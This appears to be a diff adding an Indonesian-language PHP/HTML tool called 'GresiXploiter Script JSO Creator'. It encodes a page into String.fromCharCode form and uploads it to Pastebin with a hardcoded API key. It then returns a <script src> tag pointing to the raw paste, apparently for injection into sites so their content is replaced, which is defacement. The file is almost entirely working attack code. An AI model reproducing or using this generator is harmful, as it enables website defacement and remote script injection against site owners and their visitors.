@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<link href="https://fonts.googleapis.com/css?family=Oxanium|Kaushan+Script|Spicy+Rice|Trade+Winds" rel="stylesheet" type="text/css">
+<meta name="viewport" content="width=1000, user-scalable=no">
+<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
+<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
+<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
+
+<style>
+body{
+background-color: black;
+background-size: cover;
+background-attachment: fixed; 
+text-align: center;
+font-family: Oxanium;
+overflow: hidden;
+}
+textarea{
+  font-size: 19px;
+  font-family: Oxanium;
+  border-radius: 17px;
+  background:#191919; color:green; margin:0 4px; border:1px solid  green;
+}
+input[type=text]{
+  font-size: 19px;
+  font-family: Oxanium;
+  border-radius: 17px;
+  background:#191919; color:green; margin:0 4px; border:1px solid  green;
+}
+input[type=submit] {
+  height: 45px;
+  width: 250px;
+  font-family: Spicy Rice;
+  border:black solid;
+  font-size: 23px;
+  color: green;
+  border-top: 1px solid green;
+  border-left: 1px solid green;
+  border-right: 1px solid green;
+  border-bottom: 4px solid green;
+  border-radius: 6px;
+  background-color: black ;
+
+}
+input[type=submit]:hover {
+  height: 45px;
+  width: 240px;
+  font-family: Spicy Rice;
+  border:black solid;
+  font-size: 21px;
+  color: green;
+  border-top: 1px solid green;
+  border-left: 1px solid green;
+  border-right: 1px solid green;
+  border-bottom: 4px solid green;
+  border-radius: 6px;
+  background-color: black ;
+
+
+}
+
+.hayu {
+  height: 45px;
+  width: 250px;
+  font-family: Spicy Rice;
+  border:black solid;
+  font-size: 23px;
+  color: green;
+  border-top: 1px solid green;
+  border-left: 1px solid green;
+  border-right: 1px solid green;
+  border-bottom: 4px solid green;
+  border-radius: 6px;
+  background-color: black ;
+
+}
+.hayu:hover {
+  height: 45px;
+  width: 240px;
+  font-family: Spicy Rice;
+  border:black solid;
+  font-size: 21px;
+  color: green;
+  border-top: 1px solid green;
+  border-left: 1px solid green;
+  border-right: 1px solid green;
+  border-bottom: 4px solid green;
+  border-radius: 6px;
+  background-color: black ;
+
+}
+table{
+  background-color: black;
+  border: 3px green solid;
+  border-radius: 9px;
+  margin-top: 6px;
+  margin-bottom: 6px;
+}
+</style>
+<html>
+
+<head>
+    <title>Script JSO Creator</title>
+    <script>
+        function runCharCodeAt() {
+            input = document.charCodeAt.input.value;
+            output = "";
+            for(i=0; i<input.length; ++i) {
+                if (output != "") output += ", ";
+                output += input.charCodeAt(i);
+            }
+            document.charCodeAt.output.value = output;
+        }
+    </script>
+
+</head>
+<body>
+<center><br><hr color="green"><font size="13" style="font-family: Trade Winds;color: green;">Gresi<font color="white">X</font>ploiter</font><hr color="green"><br><br>
+    <form name="charCodeAt" method="post"><table cellpadding="5"><td>
+        <textarea name="input" style="width: 600px;height: 270px;" ></textarea><br><br><center>
+        <input type="button" class="hayu" onclick="runCharCodeAt()" value="Ubah Ke JSO" ><br><br>
+        <textarea name="output" style="width: 600px;height: 270px;" ></textarea><br><br><center>
+        <input type="submit" name="submit" value="Auto Jadi"><br><br>
+    </form>
+</td></table><br><br>
+<?php
+ 
+if (isset($_POST['submit'])) {
+    if (empty($_POST['output'])) {
+        echo "<script>swal('ERROR ', 'Convert Dulu Ke JS0 !', 'error')</script>";
+    } else {
+$isi = $_POST['output'];
+$random = rand(1, 99999999);
+$api_dev_key            = '633fcbdacbff82bfd5dd821a9f8921f7'; // your api_developer_key
+$api_paste_code         = "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
+$api_paste_private      = '0'; // 0=public 1=unlisted 2=private
+$api_paste_name         = $random; // name or title of your paste
+$api_paste_expire_date      = 'N';
+$api_paste_format       = 'text';
+$api_user_key           = ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
+$api_paste_name         = urlencode($api_paste_name);
+$api_paste_code         = urlencode($api_paste_code);
+ 
+$url                = 'https://pastebin.com/api/api_post.php';
+$ch                 = curl_init($url);
+ 
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_VERBOSE, 1);
+curl_setopt($ch, CURLOPT_NOBODY, 0);
+ 
+$response           = curl_exec($ch);
+$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
+$asu = '<script type="text/javascript" src="'.$hasil.'"></script>';
+$kk = htmlspecialchars($asu);
+echo "<script>swal('Ok Done ', 'Copas Hasilnya Dibawah !', 'success')</script><table cellpadding=5><td><br><textarea style=\"width: 650px;height: 70px;\" id=hasil >$kk</textarea><br><br><center><button class=\"hayu\" type=\"button\" onclick=\"copy_text()\">Salin Hasil</button><br><br></td><br></table></center>";
+}
+}
+ 
+ ?>
+ <script type="text/javascript">
+    function copy_text() {
+        document.getElementById("hasil").select();
+        document.execCommand("copy");
+        alert("Script JSO Berhasil DiSalin !");
+    }
+</script>
+ </center>
+</body>
+</html>
+</body>
+</html>
